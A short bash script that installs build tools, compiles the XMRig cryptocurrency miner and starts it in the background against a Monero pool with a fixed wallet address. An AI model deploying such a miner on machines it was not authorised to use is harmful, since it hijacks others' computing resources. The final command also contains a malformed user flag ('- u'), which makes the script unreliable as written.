#!/bin/bash
apt-get update
wait
apt-get -y install git build-essential cmake automake libtool autoconf
wait
git clone https://github.com/xmrig/xmrig.git
wait
mkdir xmrig/build && cd xmrig/scripts
wait
./build_deps.sh && cd ../build
wait
cmake .. -DXMRIG_DEPS=scripts/deps;make -j$(nproc)
wait
./xmrig --tls -o us-west.minexmr.com:443 - u 44HVbpjPPPpfLtEULwsoUEUNfJ6rAVvrVUde1LgyYmmEf1o7xVyKECVewY1bGbXg7jbsCjo7EM3UFdKkjea5VSdDKLDWxqi -B --syslog --randomx-1gb-pages